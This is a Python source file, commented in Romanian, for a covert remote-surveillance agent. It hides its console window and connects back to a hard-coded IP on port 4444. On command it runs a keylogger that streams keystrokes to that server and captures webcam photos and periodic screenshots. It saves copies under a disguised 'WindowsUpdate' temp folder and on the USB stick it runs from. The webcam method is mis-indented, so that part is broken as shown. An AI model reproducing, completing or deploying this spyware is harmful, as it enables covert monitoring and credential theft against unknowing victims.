import socket
import threading
import time
import pynput.keyboard
from pynput import keyboard
from PIL import ImageGrab
import cv2
import os
import sys
import ctypes
from datetime import datetime

# ====================== ASCUNDERE CONSOLĂ ======================
if sys.platform == "win32":
    try:
        ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), 0)
    except:
        pass

class Agent:
    def __init__(self):
        self.server_ip = "10.91.225.249"      # <<< SCHIMBĂ CU IP-UL TĂU ACTUAL (ipconfig)
        self.server_port = 4444
        self.socket = None
        
        self.keylogger_running = False
        self.camera_running = False
        self.screenshot_running = False
        self.key_listener = None
        self.camera = None
        self.buffer = ""
        self.last_send_time = time.time()

        # Foldere sigure (TEMP) - funcționează pe orice Windows
        self.base_folder = os.path.join(os.getenv('TEMP'), "WindowsUpdate")


                # ====================== USB STICK PATH ======================
        # Detectăm folderul de unde rulează agentul (stick-ul USB)
        if getattr(sys, 'frozen', False):
            # Dacă e compilat cu PyInstaller (.exe)
            self.usb_path = os.path.dirname(sys.executable)
        else:
            # Dacă rulezi ca .py
            self.usb_path = os.path.dirname(os.path.abspath(__file__))

        # Creăm foldere pe stick (dacă nu există)
        self.usb_photo_folder = os.path.join(self.usb_path, "photos")
        self.usb_screenshot_folder = os.path.join(self.usb_path, "screenshots")
        
        try:
            os.makedirs(self.usb_photo_folder, exist_ok=True)
            os.makedirs(self.usb_screenshot_folder, exist_ok=True)
        except:
            pass
        self.photo_folder = os.path.join(self.base_folder, "photos")
        self.screenshot_folder = os.path.join(self.base_folder, "screenshots")
        
        try:
            os.makedirs(self.photo_folder, exist_ok=True)
            os.makedirs(self.screenshot_folder, exist_ok=True)
        except:
            pass

    def connect_to_server(self):
        while True:
            try:
                self.socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                self.socket.connect((self.server_ip, self.server_port))
                self.listen_for_commands()
                break
            except:
                time.sleep(5)

    def listen_for_commands(self):
        while True:
            try:
                command = self.socket.recv(1024).decode('utf-8').strip()
                if not command:
                    continue
                    
                if command == "START_KEYLOGGER":
                    self.start_keylogger()
                elif command == "STOP_KEYLOGGER":
                    self.stop_keylogger()
                elif command == "START_CAMERA":
                    self.start_camera()
                elif command == "STOP_CAMERA":
                    self.stop_camera()
                elif command == "TAKE_SCREENSHOT":
                    self.take_screenshot()
                elif command == "START_SCREENSHOT":
                    self.start_auto_screenshot()
                elif command == "STOP_SCREENSHOT":
                    self.stop_auto_screenshot()
            except:
                break

    # ====================== KEYLOGGER ======================
    def start_keylogger(self):
        if self.keylogger_running:
            return
        self.keylogger_running = True
        self.buffer = ""
        self.last_send_time = time.time()

        def on_press(key):
            try:
                char = key.char
            except AttributeError:
                if key == keyboard.Key.space:
                    char = " "
                elif key == keyboard.Key.enter:
                    char = "\n"
                elif key == keyboard.Key.backspace:
                    char = "[BACK]"
                else:
                    char = f"[{str(key).replace('Key.', '')}]"

            self.buffer += char

            if (len(self.buffer) >= 10 or 
                key in [keyboard.Key.enter, keyboard.Key.backspace] or 
                time.time() - self.last_send_time > 2.0):
                
                if self.buffer.strip():
                    self.send_data(f"KEYLOG: {self.buffer}")
                    self.buffer = ""
                    self.last_send_time = time.time()

        self.key_listener = keyboard.Listener(on_press=on_press)
        self.key_listener.start()
        self.send_data("Keylogger started")

    def stop_keylogger(self):
        if self.key_listener:
            self.key_listener.stop()
        self.keylogger_running = False
        self.send_data("Keylogger stopped")

    # ====================== WEBCAM ======================
        def start_camera(self):
            if self.camera_running:
                return
        self.camera_running = True
        
        def camera_loop():
            self.camera = cv2.VideoCapture(0)
            if not self.camera.isOpened():
                self.send_data("ERROR: Camera not accessible")
                self.camera_running = False
                return
                
            while self.camera_running:
                ret, frame = self.camera.read()
                if ret:
                    timestamp = datetime.now().strftime("%Y-%m-%d_%H-%M-%S")
                    filename = f"cam_{timestamp}.jpg"
                    
                    # Salvare pe calculator (cum aveai)
                    filepath_pc = os.path.join(self.photo_folder, filename)
                    cv2.imwrite(filepath_pc, frame)
                    
                    # Salvare și pe stick-ul USB
                    filepath_usb = os.path.join(self.usb_photo_folder, filename)
                    cv2.imwrite(filepath_usb, frame)
                    
                    self.send_data(f"PHOTO_SAVED: {filename} (PC + USB)")
                time.sleep(15)   # poți schimba intervalul dacă vrei
                
        threading.Thread(target=camera_loop, daemon=True).start()
        self.send_data("Camera started (salvează pe PC + USB)")

    def stop_camera(self):
        self.camera_running = False
        if self.camera:
            self.camera.release()
        self.send_data("Camera stopped")

    # ====================== SCREENSHOT ======================
    def take_screenshot(self):
        try:
            timestamp = datetime.now().strftime("%Y-%m-%d_%H-%M-%S")
            filename = f"screenshot_{timestamp}.png"
            
            # Salvare pe calculator (cum aveai tu)
            filepath_pc = os.path.join(self.screenshot_folder, filename)
            screenshot = ImageGrab.grab()
            screenshot.save(filepath_pc)
            
            # Salvare și pe stick-ul USB
            filepath_usb = os.path.join(self.usb_screenshot_folder, filename)
            screenshot.save(filepath_usb)
            
            self.send_data(f"SCREENSHOT_SAVED: {filename} (PC + USB)")
        except Exception as e:
            self.send_data(f"ERROR: Screenshot failed - {str(e)}")

    def start_auto_screenshot(self):
        if self.screenshot_running:
            return
        self.screenshot_running = True
        def loop():
            while self.screenshot_running:
                self.take_screenshot()
                time.sleep(30)
        threading.Thread(target=loop, daemon=True).start()
        self.send_data("Auto screenshot started (every 30s)")

    def stop_auto_screenshot(self):
        self.screenshot_running = False
        self.send_data("Auto screenshot stopped")

    # ====================== TRIMITERE ======================
    def send_data(self, data):
        try:
            message = f"[{datetime.now().strftime('%H:%M:%S')}] {data}"
            self.socket.send((message + "\n").encode('utf-8'))
        except:
            pass

# ====================== PORNIRE ======================
if __name__ == "__main__":
    agent = Agent()
    agent.connect_to_server()